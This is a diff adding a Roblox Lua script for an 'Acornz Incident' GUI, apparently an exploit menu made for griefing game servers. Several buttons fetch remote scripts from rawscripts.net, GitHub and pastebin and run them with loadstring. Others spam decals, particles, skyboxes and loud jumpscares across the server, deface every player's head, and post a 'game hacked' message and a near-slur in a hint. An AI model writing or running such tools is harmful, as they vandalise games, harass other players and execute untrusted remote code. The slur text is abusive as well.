@@ -1,0 +1,557 @@
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+local UserInputService = game:GetService("UserInputService")
+
+local gui = Instance.new("ScreenGui")
+
+gui.Name = "AcornIncidientGui"
+
+gui.ResetOnSpawn = false
+
+gui.Parent = PlayerGui
+
+local mainFrame = Instance.new("ScrollingFrame")
+
+mainFrame.Name = "MainFrame"
+
+mainFrame.Size = UDim2.new(0, 360, 0, 360)
+
+mainFrame.Position = UDim2.new(0.35, 0, 0.25, 0)
+
+mainFrame.BackgroundTransparency = 1
+
+mainFrame.CanvasSize = UDim2.new(0, 0, 0, 720)
+
+mainFrame.ScrollBarThickness = 8
+
+mainFrame.ClipsDescendants = true
+
+mainFrame.Active = true
+
+mainFrame.Draggable = false
+
+mainFrame.Parent = gui
+
+local dragging = false
+
+local dragInput, dragStart, startPos
+
+mainFrame.InputBegan:Connect(function(input)
+
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+
+dragging = true
+
+dragStart = input.Position
+
+startPos = mainFrame.Position
+
+input.Changed:Connect(function()
+
+if input.UserInputState == Enum.UserInputState.End then
+
+dragging = false
+
+end
+
+end)
+
+end
+
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+
+if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+
+local delta = input.Position - dragStart
+
+mainFrame.Position = UDim2.new(
+
+startPos.X.Scale, startPos.X.Offset + delta.X,
+
+startPos.Y.Scale, startPos.Y.Offset + delta.Y
+
+)
+
+end
+
+end)
+
+local sizeConstraint = Instance.new("UISizeConstraint")
+
+sizeConstraint.MaxSize = Vector2.new(360, 360)
+
+sizeConstraint.MinSize = Vector2.new(360, 360)
+
+sizeConstraint.Parent = mainFrame
+
+local bgImage = Instance.new("ImageLabel")
+
+bgImage.Size = UDim2.new(1, 0, 1, 0)
+
+bgImage.Position = UDim2.new(0, 0, 0, 0)
+
+bgImage.BackgroundTransparency = 1
+
+bgImage.Image = "rbxassetid://99096302161544"
+
+bgImage.ScaleType = Enum.ScaleType.Stretch
+
+bgImage.Parent = mainFrame
+
+local corner = Instance.new("UICorner")
+
+corner.CornerRadius = UDim.new(0, 10)
+
+corner.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+
+title.Size = UDim2.new(1, 0, 0, 60)
+
+title.Position = UDim2.new(0, 0, 0, 7)
+
+title.BackgroundTransparency = 1
+
+title.Text = "Ac*rnz İncident Gui V???"
+
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+title.TextStrokeTransparency = 0
+
+title.Font = Enum.Font.FredokaOne
+
+title.TextSize = 24
+
+title.TextWrapped = true
+
+title.TextYAlignment = Enum.TextYAlignment.Center
+
+title.Parent = mainFrame
+
+local function createButton(name, posX, posY, customTextSize)
+
+local button = Instance.new("TextButton")
+
+button.Text = name
+
+button.Size = UDim2.new(0, 160, 0, 45)
+
+button.Position = UDim2.new(0, posX, 0, posY)
+
+button.BackgroundColor3 = Color3.fromRGB(9, 0, 90)
+
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+button.Font = Enum.Font.FredokaOne
+
+button.TextSize = customTextSize or 26
+
+button.AutoButtonColor = true
+
+button.TextWrapped = true
+
+button.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+
+stroke.Color = Color3.fromRGB(7, 44, 177)
+
+stroke.Thickness = 1.5
+
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+stroke.Parent = button
+
+return button
+
+end
+
+local johnDoeBtn = createButton("Jhn D#e", 10, 60)
+
+local thomasBtn = createButton("Th#ms", 190, 60)
+
+local italyJumpscareBtn = createButton("ltly Jumpsc#re", 10, 115)
+
+local shedletskyBtn = createButton("Shdl#tsky", 190, 115)
+
+local marioExeBtn = createButton("M#ri*.Exe", 10, 170)
+
+local skeletonSkyboxBtn = createButton("Sklt#n", 190, 170)
+
+local skyboxBtn = createButton("Skybx", 10, 225)
+
+local particlesBtn = createButton("Prtic#z", 190, 225)
+
+local hintBtn = createButton("H*nt", 10, 280)
+
+local messageBtn = createButton("M*ssage", 190, 280)
+
+local decalSpamBtn = createButton("Dcal Sp#m", 10, 335)
+
+local jumpscare1Btn = createButton("Jmpsc#re 1", 190, 335)
+
+local jumpscare2Btn = createButton("Jmpsc#re 2", 10, 390)
+
+local faceAllAcornzBtn = createButton("F*ce All Ac*rnz", 190, 390)
+
+local themeBtn = createButton("Th#me", 10, 445)
+
+local billboardBtn = createButton("B#lb#rd", 190, 445)
+
+local credits = Instance.new("TextLabel")
+
+credits.Size = UDim2.new(1, 0, 0, 30)
+
+credits.Position = UDim2.new(0, 0, 0, 690)
+
+credits.BackgroundTransparency = 1
+
+credits.Text = "Credits: none Made by: epicxploiterz"
+
+credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+credits.TextStrokeTransparency = 0
+
+credits.Font = Enum.Font.FredokaOne
+
+credits.TextSize = 14
+
+credits.TextWrapped = true
+
+credits.TextYAlignment = Enum.TextYAlignment.Center
+
+credits.Parent = mainFrame
+
+johnDoeBtn.MouseButton1Click:Connect(function()
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Client-Replication-ULTRA-JOHN-DOE-39837"))()
+
+end)
+
+thomasBtn.MouseButton1Click:Connect(function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Thomas%20The%20Dank%20Engine.txt"))()
+
+end)
+
+italyJumpscareBtn.MouseButton1Click:Connect(function()
+
+local frame = Instance.new("ScreenGui", PlayerGui)
+
+frame.ResetOnSpawn = false
+
+local img = Instance.new("ImageLabel", frame)
+
+img.Size = UDim2.new(1, 0, 1, 0)
+
+img.Position = UDim2.new(0, 0, 0, 0)
+
+img.BackgroundTransparency = 1
+
+img.Image = "rbxassetid://130901824111031"
+
+local sound = Instance.new("Sound", game.SoundService)
+
+sound.SoundId = "rbxassetid://6129291390"
+
+sound.Volume = 10
+
+sound:Play()
+
+sound.Ended:Connect(function()
+
+frame:Destroy()
+
+sound:Destroy()
+
+end)
+
+end)
+
+shedletskyBtn.MouseButton1Click:Connect(function()
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shedletsky-skybox-decal-spam-and-particles-39207"))()
+
+end)
+
+marioExeBtn.MouseButton1Click:Connect(function()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/gMtScLkU"))()
+
+end)
+
+skeletonSkyboxBtn.MouseButton1Click:Connect(function()
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-skeleton-sky-10383"))()
+
+end)
+
+skyboxBtn.MouseButton1Click:Connect(function()
+
+local sky = Instance.new("Sky")
+
+sky.SkyboxBk = "rbxassetid://99096302161544"
+
+sky.SkyboxDn = "rbxassetid://99096302161544"
+
+sky.SkyboxFt = "rbxassetid://99096302161544"
+
+sky.SkyboxLf = "rbxassetid://99096302161544"
+
+sky.SkyboxRt = "rbxassetid://99096302161544"
+
+sky.SkyboxUp = "rbxassetid://99096302161544"
+
+sky.Parent = game:GetService("Lighting")
+
+end)
+
+particlesBtn.MouseButton1Click:Connect(function()
+
+local runService = game:GetService("RunService")
+
+for _, player in pairs(Players:GetPlayers()) do
+
+if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+
+local root = player.Character.HumanoidRootPart
+
+for i = 1, 150 do
+
+local particle = Instance.new("ParticleEmitter")
+
+particle.Texture = "rbxassetid://99096302161544"
+
+particle.Rate = 500
+
+particle.Lifetime = NumberRange.new(1)
+
+particle.Speed = NumberRange.new(5)
+
+particle.Parent = root
+
+end
+
+end
+
+end
+
+end)
+
+hintBtn.MouseButton1Click:Connect(function()
+
+local hint = Instance.new("Hint")
+
+hint.Text = "ACORN ON TOP,JOİN TODAY NGGGGGGA🤑😔😱"
+
+hint.Parent = game.Workspace
+
+end)
+
+messageBtn.MouseButton1Click:Connect(function()
+
+local msg = Instance.new("Message")
+
+msg.Text = "Team Ac0rnz Game Hot Hacked🤑"
+
+msg.Parent = game.Workspace
+
+wait(10)
+
+msg:Destroy()
+
+end)
+
+decalSpamBtn.MouseButton1Click:Connect(function()
+
+for _, obj in ipairs(workspace:GetDescendants()) do
+
+if obj:IsA("BasePart") then
+
+for i = 1, 6 do
+
+local d = Instance.new("Decal")
+
+d.Face = Enum.NormalId[Enum.NormalId:GetEnumItems()[i].Name]
+
+d.Texture = "rbxassetid://99096302161544"
+
+d.Parent = obj
+
+end
+
+end
+
+end
+
+end)
+
+jumpscare1Btn.MouseButton1Click:Connect(function()
+
+local frame = Instance.new("ScreenGui", PlayerGui)
+
+frame.ResetOnSpawn = false
+
+local img = Instance.new("ImageLabel", frame)
+
+img.Size = UDim2.new(1, 0, 1, 0)
+
+img.Position = UDim2.new(0, 0, 0, 0)
+
+img.BackgroundTransparency = 1
+
+img.Image = "rbxassetid://99096302161544"
+
+local sound = Instance.new("Sound", game.SoundService)
+
+sound.SoundId = "rbxassetid://6129291390"
+
+sound.Volume = 10
+
+sound:Play()
+
+sound.Ended:Connect(function()
+
+frame:Destroy()
+
+sound:Destroy()
+
+end)
+
+end)
+
+jumpscare2Btn.MouseButton1Click:Connect(function()
+
+local frame = Instance.new("ScreenGui", PlayerGui)
+
+frame.ResetOnSpawn = false
+
+local img = Instance.new("ImageLabel", frame)
+
+img.Size = UDim2.new(1, 0, 1, 0)
+
+img.Position = UDim2.new(0, 0, 0, 0)
+
+img.BackgroundTransparency = 1
+
+img.Image = "rbxassetid://81106157519970"
+
+local sound = Instance.new("Sound", game.SoundService)
+
+sound.SoundId = "rbxassetid://6129291390"
+
+sound.Volume = 10
+
+sound:Play()
+
+sound.Ended:Connect(function()
+
+frame:Destroy()
+
+sound:Destroy()
+
+end)
+
+end)
+
+faceAllAcornzBtn.MouseButton1Click:Connect(function()
+
+for i, v in pairs(Players:GetPlayers()) do
+
+if v.Character and v.Character:FindFirstChild("Head") then
+
+local head = v.Character.Head
+
+local gui1 = Instance.new("BillboardGui")
+
+gui1.Parent = head
+
+gui1.Adornee = head
+
+gui1.Size = UDim2.new(2.5, 0, 2.5, 0)
+
+gui1.StudsOffset = Vector3.new(0, 0.2, 0)
+
+gui1.AlwaysOnTop = true
+
+local text1 = Instance.new("ImageLabel")
+
+text1.Image = "http://www.roblox.com/asset/?id=7386395660"
+
+text1.Size = UDim2.new(1, 0, 1, 0)
+
+text1.Position = UDim2.new(0, 0, 0, 0)
+
+text1.BackgroundTransparency = 1
+
+text1.Parent = gui1
+
+head.Transparency = 1
+
+end
+
+end
+
+end)
+
+themeBtn.MouseButton1Click:Connect(function()
+
+local s = Instance.new("Sound", game.SoundService)
+
+s.SoundId = "rbxassetid://1839246711"
+
+s.Volume = 10
+
+s.Looped = true
+
+s.Name = "ThemeMusic"
+
+s:Play()
+
+end)
+
+billboardBtn.MouseButton1Click:Connect(function()
+
+if player.Character and player.Character:FindFirstChild("Head") then
+
+local head = player.Character.Head
+
+local billboard = Instance.new("BillboardGui")
+
+billboard.Parent = head
+
+billboard.Adornee = head
+
+billboard.Size = UDim2.new(0, 200, 0, 100)
+
+billboard.StudsOffset = Vector3.new(0, 1, 0)
+
+billboard.AlwaysOnTop = true
+
+local textLabel = Instance.new("TextLabel")
+
+textLabel.Parent = billboard
+
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+
+textLabel.BackgroundTransparency = 1
+
+textLabel.Text = "xAcornx"
+
+textLabel.TextColor3 = Color3.fromRGB(0, 0, 255)
+
+textLabel.Font = Enum.Font.FredokaOne
+
+textLabel.TextSize = 24
+
+textLabel.TextWrapped = true
+
+end
+
+end)
